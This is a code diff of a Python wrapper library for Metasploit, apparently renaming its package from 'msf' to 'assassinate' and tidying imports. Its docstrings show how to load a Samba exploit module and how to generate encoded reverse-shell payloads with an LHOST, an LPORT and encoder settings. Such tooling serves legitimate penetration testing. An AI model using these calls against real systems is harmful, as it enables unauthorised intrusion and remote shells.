@@ -13,13 +13,13 @@ for each of the 7 MSF module types:
 - PostModule: Post-exploitation, requires session (run(session))
 
 Example:
-    from msf import init_msf, create_module
+    import assassinate
 
-    init_msf("/path/to/metasploit-framework")
+    assassinate.init_msf("/path/to/metasploit-framework")
 
     # Factory returns appropriate type
-    exploit = create_module("exploit/linux/samba/is_known_pipename")
-    assert isinstance(exploit, ExploitModule)
+    exploit = assassinate.create_module("exploit/linux/samba/is_known_pipename")
+    assert isinstance(exploit, assassinate.ExploitModule)
     assert exploit.module_type == "exploit"
 
     # Type-specific API
@@ -35,10 +35,10 @@ import logging
 from typing import Any, Callable, Dict, List, Mapping, Optional, Union, TYPE_CHECKING
 
 from .options import ModuleOptions
-from assassinate.console import print_module
+from .console import print_module
 
 # Get logger for this module
-logger = logging.getLogger("msf.module")
+logger = logging.getLogger("assassinate.module")
 
 if TYPE_CHECKING:
     from .session import Session
@@ -612,6 +612,7 @@ class ExploitModule(BaseModule):
                 logger.warning("Async exploit job failed to start")
             return job_id
 
+        # Import at runtime to avoid circular imports
         from . import wait_for_new_session, list_sessions
         from .session import Session
 
@@ -1003,7 +1004,7 @@ class EncoderModule(BaseModule):
                                          LHOST="10.0.0.1", LPORT=4444)
 
         # Or use forge_encoded directly (recommended)
-        from msf import forge_encoded
+        from assassinate import forge_encoded
         encoded = forge_encoded("linux/x86/shell_reverse_tcp",
                                encoder="x86/shikata_ga_nai",
                                iterations=3)
@@ -1081,12 +1082,12 @@ class EncoderModule(BaseModule):
 
         Alternatives:
             # Option 1: Use forge_encoded with a payload name
-            from msf import forge_encoded
+            from assassinate import forge_encoded
             encoded = forge_encoded("linux/x86/shell_reverse_tcp",
                                    encoder="x86/shikata_ga_nai")
 
             # Option 2: Auto-select encoder to avoid badchars
-            from msf import forge_payload_with_badchars
+            from assassinate import forge_payload_with_badchars
             encoded, encoder_used = forge_payload_with_badchars(
                 "linux/x86/shell_reverse_tcp",
                 badchars=b"\\x00\\x0a"
@@ -1167,5 +1168,3 @@ class NopModule(BaseModule):
         except Exception as e:
             logger.error(f"NOP sled generation failed for {self.fullname}: {e}")
             raise
-
-
